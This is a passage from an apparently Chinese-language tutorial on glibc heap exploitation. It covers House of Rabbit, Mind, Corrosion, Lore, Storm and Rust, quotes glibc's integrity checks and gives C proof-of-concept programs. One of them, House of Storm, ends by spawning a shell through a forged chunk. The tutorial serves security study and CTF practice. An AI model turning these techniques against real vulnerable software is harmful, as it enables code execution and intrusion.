class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">void</span> *fast, *small;</span><br><span class="line">	<span class="type">char</span> *victim, target[<span class="number">0x20</span>];</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">free</span>(<span class="built_in">malloc</span>(<span class="number">0x80000</span>));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x80000</span>);</span><br><span class="line"></span><br><span class="line">	fast = <span class="built_in">malloc</span>(<span class="number">0x10</span>); 		</span><br><span class="line">	small = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(fast);</span><br><span class="line"></span><br><span class="line">	gbuf[<span class="number">3</span>] = <span class="number">0x1</span>;	</span><br><span class="line"></span><br><span class="line">	*(<span class="type">unsigned</span> <span class="type">long</span>**)fast = &amp;gbuf[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(small);</span><br><span class="line"></span><br><span class="line">	gbuf[<span class="number">3</span>] = <span class="number">0x80001</span>;</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x80000</span>);</span><br><span class="line"></span><br><span class="line">	gbuf[<span class="number">3</span>] = (<span class="type">void</span>*)&amp;target-(<span class="type">void</span>*)(gbuf+<span class="number">2</span>)<span class="number">-0x20</span>+<span class="number">0x30</span>;	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">malloc</span>((<span class="type">void</span>*)&amp;target-(<span class="type">void</span>*)(gbuf+<span class="number">2</span>)<span class="number">-0x20</span>);</span><br><span class="line">	victim = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	</span><br><span class="line">	assert(victim == &amp;target);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,victim);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>glibc-2.26 起，unlink 加入了对 next chunk 的 prev_size 的检查。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action, <span class="string">&quot;corrupted size vs. prev_size&quot;</span>, P, AV);  \</span></span><br></pre></td></tr></table></figure></div>

<p>而从 large bin 中取出 chunk 时用的是 unlink 。虽然可以通过设置 size 大小使 next chunk 的 prev_size 在可控内存上，但是很有可能会造成之后从 unsorted bin 中取 chunk 时 size 通不过检查，这无疑增加了利用难度。</p>
<p>glibc-2.27 起，malloc_consolidate 加入了对 fast bin 中 chunk 的 size 的检查。至此，house of rabbit 攻击效果与 fast bin attack 相当，<del>不如 tcache attack</del>  。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((&amp;fastbin (av, idx)) != fb)</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h1 id="House-of-Mind"><a href="#House-of-Mind" class="headerlink" title="House of Mind"></a>House of Mind</h1><p>对于非 main_arena 管理的堆是在 mmap 出的一块 heap_info 结构的内存区域中分配内存的。house of mind  正是通过伪造 arena 和 heap info 实现在伪造的 arena 上写一个 chunk 的地址。这里以 fast bin 范围的 chunk 举例。</p>
<p>当释放的 chunk 的 NON_MAIN_ARENA 标志位置 1 则 ptmalloc 认为该 chunk 不属于 main_arena 管理，因此通过先寻找其对应的 heap_info ，然后通过 heap_info 的 ar_ptr 查找 chunk 对应的 arena 。</p>
<p>根据 chunk 寻找 arena 的过程具体实现如下，其中 HEAP_MAX_SIZE 为 0x4000000 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> heap_for_ptr(ptr) \</span></span><br><span class="line"><span class="meta">  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_for_chunk(ptr) \</span></span><br><span class="line"><span class="meta">  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span></span><br></pre></td></tr></table></figure></div>

<p>因此可以考虑伪造 heap_info 和 arena 将一个在 fake heap_info 范围内的 chunk 的 NON_MAIN_ARENA 标志位置 1 然后释放该 chunk ，从而在伪造的 arena 上写该 chunk 的地址<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/5183f883b1249e6b01b8072f7e377a22.png"
                     
                ></p>
<p>其中 system_mem 置为 inf 是为了绕过如下检查：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">		     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">     &#123;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">   after getting the lock.  */</span></span><br><span class="line"><span class="keyword">if</span> (have_lock</span><br><span class="line">    || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">	  mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">	  locked = <span class="number">1</span>;</span><br><span class="line">	  chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">	    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">      &#125;))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (! have_lock)</span><br><span class="line">  &#123;</span><br><span class="line">    (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    locked = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure></div>

<p><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_mind" >poc<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;	</span><br><span class="line">	<span class="type">int</span> HEAP_MAX_SIZE = <span class="number">0x4000000</span>;</span><br><span class="line">	<span class="type">int</span> MAX_SIZE = (<span class="number">128</span> * <span class="number">1024</span>) - <span class="number">0x100</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="type">uint8_t</span> * fake_arena = <span class="built_in">malloc</span>(<span class="number">0x1000</span>); </span><br><span class="line">	<span class="type">uint8_t</span> * target_loc = fake_arena + <span class="number">0x28</span>;</span><br><span class="line">	<span class="type">uint8_t</span> * target_chunk = (<span class="type">uint8_t</span> *) fake_arena - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">	fake_arena[<span class="number">0x880</span>] = <span class="number">0xff</span>;</span><br><span class="line">	fake_arena[<span class="number">0x881</span>] = <span class="number">0xff</span>; </span><br><span class="line">	fake_arena[<span class="number">0x882</span>] = <span class="number">0xff</span>; </span><br><span class="line">	fake_arena[<span class="number">0x883</span>] = <span class="number">0xff</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span> new_arena_value = (((<span class="type">uint64_t</span>)target_chunk) + HEAP_MAX_SIZE) &amp; ~(HEAP_MAX_SIZE - <span class="number">1</span>);</span><br><span class="line">	<span class="type">uint64_t</span> * fake_heap_info = (<span class="type">uint64_t</span> *)new_arena_value;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span> * user_mem = <span class="built_in">malloc</span>(MAX_SIZE);</span><br><span class="line">	<span class="keyword">while</span>((<span class="type">long</span> <span class="type">long</span>)user_mem &lt; new_arena_value)&#123;</span><br><span class="line">        <span class="comment">// 使heap_for_ptr(victim)落在fake_heap_info上</span></span><br><span class="line">		user_mem = <span class="built_in">malloc</span>(MAX_SIZE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span> * fastbin_chunk = <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	<span class="type">uint64_t</span> * chunk_ptr = fastbin_chunk - <span class="number">2</span>;</span><br><span class="line">    </span><br><span class="line">	fake_heap_info[<span class="number">0</span>] = (<span class="type">uint64_t</span>) fake_arena; <span class="comment">// Setting the fake ar_ptr (arena)</span></span><br><span class="line">	chunk_ptr[<span class="number">1</span>] = <span class="number">0x60</span> | <span class="number">0x4</span>; <span class="comment">// Setting the non-main arena bit</span></span><br><span class="line">	<span class="built_in">free</span>(fastbin_chunk); <span class="comment">// Trigger the madness</span></span><br><span class="line"></span><br><span class="line">	assert(*((<span class="type">unsigned</span> <span class="type">long</span> *)(target_loc)) != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="House-of-Corrosion"><a href="#House-of-Corrosion" class="headerlink" title="House of Corrosion"></a>House of Corrosion</h1><p>house of Corrosion 是利用 malloc 和 free 过程中对 fastbinsY 数组边界检查不严格，通过修改 global_max_fast 为一个很大的值，造成 fastbinsY 数组越界，最终导致任意地址写的一种堆利用手法。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/1366514a21b40e8a1327dcbe885c759e.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p>
<p>如果存在 UAF 漏洞的，那么可以通过修改 chunk 的 fd 再将 chunk 申请出来的的方式在 target 上写一个任意值。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/ea966ded7fa7ef248e758e930156c49b.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ><br>更进一步，可以将任意地址的值写到其它任意地址上。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/503845dadb6d5e57394e202fffe3b1c5.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                ><br>glibc-2.27 起增加了对 global_max_fast 的检测，但实际分析汇编发现检测被优化掉了。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">get_max_fast(<span class="type">void</span>) &#123;</span><br><span class="line">    <span class="comment">/* Tell the GCC optimizers that global_max_fast is never larger</span></span><br><span class="line"><span class="comment">       than MAX_FAST_SIZE.  This avoids out-of-bounds array accesses in</span></span><br><span class="line"><span class="comment">       _int_malloc after constant propagation of the size parameter.</span></span><br><span class="line"><span class="comment">       (The code never executes because malloc preserves the</span></span><br><span class="line"><span class="comment">       global_max_fast invariant, but the optimizers may not recognize</span></span><br><span class="line"><span class="comment">       this.)  */</span></span><br><span class="line">    <span class="keyword">if</span> (global_max_fast &gt; MAX_FAST_SIZE)</span><br><span class="line">        __builtin_unreachable();</span><br><span class="line">    <span class="keyword">return</span> global_max_fast;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/3eadb9da0e6eaac17723bb9902834bc4.png"
                     
                ><br>在 glibc-2.37 版本中，global_max_fast 的数据类型被修改为了 int8_u，进而导致可控的空间范围大幅度缩小。</p>
<h1 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h1><p>以 how2heap 为例：</p>
<ol>
<li><p>首先申请大小在 small bin 范围的 chunk 。</p>
</li>
<li><p>申请一个 chunk 防止 free chunk1 时与 top chunk 合并。</p>
</li>
<li><p>释放 chunk 进入 unsort bin 。</p>
</li>
<li><p>申请一个 更大的内存使 chunk1 进入 small bin ，此时状态如下图：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9015a5827307435b3e85d2085a890da4.png"
                      alt="在这里插入图片描述" style="zoom:25%;" 
                >
</li>
<li><p>如下图形式，绕过检查：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">	errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/14c140819bdb4f2c84a6b4bcb6159898.png"
                      alt="在这里插入图片描述" style="zoom:25%;" 
                >
</li>
<li><p>两次申请 chunk 即可获得 buf1 处的 chunk 。</p>
</li>
</ol>
<h1 id="House-of-Storm"><a href="#House-of-Storm" class="headerlink" title="House of Storm"></a>House of Storm</h1><p>unsorted bin attack 能够通过将目标地址链入 unsorted bin 然后取出其中另一个 chunk 从而在目标地址对应的 bk 写入  <code>unsorted_chunks (av)</code>  ，然而如果我们想要将链入 unsorted bin 的 fake chunk 申请出来却通不过检查。这就需要利用 large bin 的特性伪造 fake chunk 的 size 和 fd 字段。这种攻击方式称为 House of storm 。<br>漏洞利用条件:</p>
<ul>
<li>需要攻击者在 largebin 和 unsorted_bin 中分别布置一个 chunk 这两个 chunk 需要在归位之后处于同一个 largebin 的 index 中且 unsortedbin 中的 chunk 要比 largebin 中的大。</li>
<li>需要 unsorted_bin 中的 bk 指针可控。</li>
<li>需要 largebin 中的 bk 指针和 bk_nextsize 指针可控。</li>
</ul>
<p>下面举一个实际例子：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -ggdb -fpie -pie -o house_of_storm house_of_storm.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">char</span> chunk_head[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">char</span> content[<span class="number">0x10</span>];</span><br><span class="line">&#125; fake;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *large_bin, *unsorted_bin;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *fake_chunk;</span><br><span class="line">    <span class="type">char</span> *ptr;</span><br><span class="line"></span><br><span class="line">    unsorted_bin = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0X18</span>);</span><br><span class="line">    large_bin = <span class="built_in">malloc</span>(<span class="number">0x408</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(large_bin);</span><br><span class="line">    <span class="built_in">free</span>(unsorted_bin);</span><br><span class="line">    unsorted_bin = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="built_in">free</span>(unsorted_bin);</span><br><span class="line"></span><br><span class="line">    fake_chunk = ((<span class="type">unsigned</span> <span class="type">long</span>) fake.content) - <span class="number">0x10</span>;</span><br><span class="line">    unsorted_bin[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>) fake_chunk;</span><br><span class="line"></span><br><span class="line">    large_bin[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>) fake_chunk + <span class="number">8</span>;</span><br><span class="line">    large_bin[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>) fake_chunk - <span class="number">0x18</span> - <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">strncpy</span>(ptr, <span class="string">&quot;/bin/sh&quot;</span>, <span class="number">0x48</span> - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(fake.content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先进行如下修改：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d7893a21262ab86ca0569abd25395d2c.png"
                      alt="在这里插入图片描述" style="zoom:25%;" 
                ></p>
<p>当申请 0x48 大小的内存时，会先遍历 unsorted bin 。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((victim = <span class="built_in">unsorted_chunks</span>(av)-&gt;bk) != <span class="built_in">unsorted_chunks</span>(av))</span><br></pre></td></tr></table></figure></div>

<p>由于倒序遍历 unsorted bin 时取最后的 chunk 是根据 <code>unsorted_chunks(av)-&gt;bk</code> 取的，因此先访问的是 0x418 大小的 chunk 。<br>因为不满足下面这个判断，因此不会从该 chunk 上切下合适的 chunk ，而是将其放入 large bin 中。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">in_smallbin_range</span>(nb) &amp;&amp;</span><br><span class="line">    bck == <span class="built_in">unsorted_chunks</span>(av) &amp;&amp;</span><br><span class="line">    victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br></pre></td></tr></table></figure></div>

<p>在放入 large bin 中之前，先要将其从 unsorted bin 中取出，这就完成了一次 unsorted bin attack 。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">unsorted_chunks</span>(av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = <span class="built_in">unsorted_chunks</span>(av);</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/862cd92cc549f568a59728aee8973321.png"
                      alt="在这里插入图片描述" style="zoom: 25%;" 
                >

<p>由于取出的 chunk 大小不在 small bin 范围，所以将放入 large bin 。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">in_smallbin_range</span>(size)) &#123;</span><br><span class="line">	...</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>判断 large bin 是否为空，这里显然不为空。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">victim_index = <span class="built_in">largebin_index</span>(size);</span><br><span class="line">bck = <span class="built_in">bin_at</span>(av, victim_index);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fwd != bck) &#123;</span><br><span class="line">	...</span><br><span class="line">&#125; <span class="keyword">else</span> ...</span><br></pre></td></tr></table></figure></div>

<p>large bin 中的 chunk 是按大小降序排列。首先特判大小小于最小的 chunk 的情况。这里通过 <code>bk</code> 访问最小的 chunk ，根据事先的构造，待加入 large bin 的 chunk 大于 large bin 中最小的 chunk ，因此执行的是 else 里的内容。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size)) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">assert</span>((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);<span class="comment">//默认不启用assert</span></span><br><span class="line">    <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size) &#123;</span><br><span class="line">        fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">        <span class="built_in">assert</span>((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">        fwd = fwd-&gt;fd;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        victim-&gt;fd_nextsize = fwd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">        fwd-&gt;bk_nextsize = victim;</span><br><span class="line">        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">    bck = fwd-&gt;bk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>large bin 对 fake chunk 进行了如下修改，伪造了 size 和 bk 字段。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/1bc5ed03a57d61aa9cbee334cc831e76.png"
                     
                ></p>
<p>因为在<strong>开启 PIE</strong> 之后 chunk 的地址多为 0x55 和 0x56 开头，且长度为 6 字节，因此刚好在 size 字段中截取出合适的数值。<br><code>__int_malloc</code> 在拿到 chunk 后返回到 <code>__libc_malloc</code> ，<code>__libc_malloc</code> 会对 chunk 的进行检查。</p>
<ul>
<li>如果 size 为 0x55 那么 <code>IS_MAPPED</code> 没有置位，会判断 <code>arena_for_chunk(mem2chunk(victim))</code> 。由于 <code>NON_MAIN_ARENA</code> 置位导致计算出的 <code>arena</code> 不是 <code>main_arena(ar_ptr)</code> 因此通不过检查。</li>
<li>如果 size 为 0x56 那么 <code>IS_MAPPED</code> 置位可以通过检查。</li>
</ul>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">assert</span>(!victim || <span class="built_in">chunk_is_mmapped</span>(<span class="built_in">mem2chunk</span>(victim)) </span><br><span class="line">       || ar_ptr == <span class="built_in">arena_for_chunk</span>(<span class="built_in">mem2chunk</span>(victim)));</span><br></pre></td></tr></table></figure></div>

<p>之后继续遍历 unsorted bin 于是便将 fake chunk 申请出来。</p>
<p>glibc-2.27 加入 tcache，此时是先遍历 unsorted bin，即使找到合适的 chunk 也会放入 tcache 然后继续遍历，因此还会触发报错。因此需要先将 tcache 填满，并且最后通过 <code>calloc</code> 申请触发 house of storm 。</p>
<p>glibc-2.28 开始 unsorted bin 会有如下检查：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>glibc-2.30 开始 large bin 会有下面这条检查</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">  <span class="built_in">malloc_printerr</span> (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>因此此方法失效。</p>
<h1 id="House-of-Rust"><a href="#House-of-Rust" class="headerlink" title="House of Rust"></a>House of Rust</h1><p>该技巧就是 tcachebin stash unlinking + largebin attack 的组合技巧。</p>
<p>该利用方法的主要步骤如下：</p>
<ul>
<li><p>把 <code>tcachebin[0x90]</code> 填满，把 <code>smallbin[0x90]</code> 也填满。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/image-20241108031734130.png"
